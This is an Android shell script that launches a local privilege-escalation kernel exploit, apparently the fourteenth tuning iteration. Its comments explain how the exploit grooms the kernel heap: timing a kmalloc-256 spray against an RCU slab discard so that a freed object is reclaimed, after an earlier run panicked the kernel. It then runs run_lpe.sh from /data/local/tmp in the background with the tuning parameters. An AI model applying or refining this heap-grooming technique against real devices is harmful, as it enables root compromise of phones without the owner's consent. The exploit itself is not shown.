#!/system/bin/sh
# run14: run13 geometry + IC_EARLY_WAIT.  run13's slab chain worked and reap A
# was safe, but the B reap panicked: X's slot was still a free posix object
# (encoded freepointer at node+8), i.e. the early mcast spray finished before
# the RCU discard landed and never filled X's slab.  IC_EARLY_WAIT watches
# /proc/slabinfo for the >=31-object drop and only then starts the spray; the
# discarded page is then at the head of cpu0's pcp list, so the spray's first
# fresh kmalloc-256 slab pops it.  If the drop never shows, the attempt parks
# before spraying instead of reaping B into an unknown page.
cd /data/local/tmp || exit 1
rm -f ic-run14.log
IC_SLABTRACE=1 IC_PAD_ALIGN=1 IC_SPRAY_EARLY=1 IC_EARLY_WAIT=1 \
IC_PAD_KEEP=4185 IC_FLUSH_SPARSE=15 \
  ATTEMPTS=1 nohup sh /data/local/tmp/run_lpe.sh > /data/local/tmp/ic-run14.log 2>&1 &
exit 0
